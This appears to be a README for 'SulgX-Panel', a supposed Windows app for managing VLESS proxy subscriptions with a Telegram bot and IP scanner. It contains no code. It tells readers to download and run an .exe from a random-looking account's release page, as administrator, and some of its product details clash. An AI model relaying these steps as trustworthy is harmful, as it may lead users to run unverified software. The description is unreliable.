# 🛡️ SulgX-Panel - Manage your network subscriptions with ease

[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/fullskirtmalaya185/SulgX-Panel/releases)

SulgX-Panel provides a simple interface to manage your VLESS subscriptions. It handles WebSocket and TLS connections to keep your data secure. You gain full control over user access, bandwidth limits, and traffic monitoring without complex server knowledge. The panel includes a built-in Telegram bot to help you manage settings on the go.

## 🛠️ System Requirements

- Windows 10 or Windows 11
- 2GB of available RAM
- Active internet connection
- A modern web browser like Chrome or Edge

## 📥 How to Install

You need the latest version of the software to begin. Follow these steps to get your panel running.

1. Visit the [official release page](https://github.com/fullskirtmalaya185/SulgX-Panel/releases).
2. Look for the "Assets" section at the bottom of the latest release.
3. Choose the file that ends in .exe for Windows.
4. Click the file to start the download.
5. Once the download finishes, open your "Downloads" folder.
6. Double-click the file to launch the installation wizard.
7. Follow the prompts on the screen to finish the setup process.

## 🚀 Setting Up Your Panel

After you install the software, you must configure your initial settings. 

1. Launch the SulgX-Panel application from your Start menu.
2. The program opens a local window in your web browser.
3. The first run requires a primary administrative password. Choose a strong password and save it in a safe location.
4. Log in with your new credentials to reach the main dashboard.
5. The dashboard shows real-time traffic charts and connection status.

## 🌐 Managing Subscriptions

The panel allows you to add and edit VLESS subscriptions.

1. Navigate to the "Subscriptions" tab in the left sidebar.
2. Click the "Add New" button.
3. Paste your VLESS URL into the provided text box.
4. Set the bandwidth limit for this user if desired.
5. Save your changes to apply the new configuration.

## 🤖 Telegram Integration

You can control your panel using a Telegram bot. This allows you to check traffic levels or stop users from your phone.

1. Create a bot using BotFather on Telegram.
2. Copy the API token provided by Telegram.
3. Open the "Bot Settings" tab in your SulgX-Panel.
4. Paste the API token into the field labeled "Telegram Token".
5. Save your settings. The panel connects to Telegram and confirms the link.

## 🧹 Using the Clean IP Scanner

A clean IP helps maintain consistent connection speeds. SulgX-Panel includes a scanner to find fast routes.

1. Go to the "Tools" section in the menu.
2. Select "IP Scanner".
3. Click "Start Scan" to check available addresses.
4. The tool displays a list of IPs ranked by speed and stability.
5. Click "Apply" to use the best IP for your connections.

## 📊 Monitoring Traffic

The dashboard provides clear visuals for your bandwidth usage.

- **Real-time charts:** View spikes and drops in data usage as they happen.
- **User logs:** Check recent activity for each subscription.
- **Alerts:** The system sends a notification to your Telegram bot when users approach their bandwidth cap.

## 📝 Troubleshooting Common Issues

If you encounter problems, check these common fixes:

- **App does not open:** Ensure you have administrator rights on your computer. Right-click the icon and choose "Run as administrator."
- **Cannot connect to the panel:** Verify the local web server is active. Look for the green icon in your Windows system tray.
- **Login fails:** Ensure your caps lock key is off. If you lose your password, navigate to the config folder and delete the settings.json file to reset the login module.
- **Websocket connection error:** Check your firewall settings. The application needs permission to access your network.

## 🛡️ Best Practices for Security

- Never share your admin password with other people.
- Update your software whenever a new version appears on the release page. 
- Use a unique password for the Telegram bot connection.
- Review your user list monthly to remove inactive accounts.

## 🌐 Cloud Deployment Options

While you can run this panel on your local computer, many users prefer a cloud platform for better uptime. You can move your configuration to platforms like Render, Railway, or Dockfly. 

1. Export your current configuration from the "Settings" tab. 
2. Follow the documentation of your chosen cloud host. 
3. Upload the configuration file to the cloud environment. 
4. The panel will now run 24/7 without needing your computer. 

This approach ensures your users stay connected even when you turn off your machine.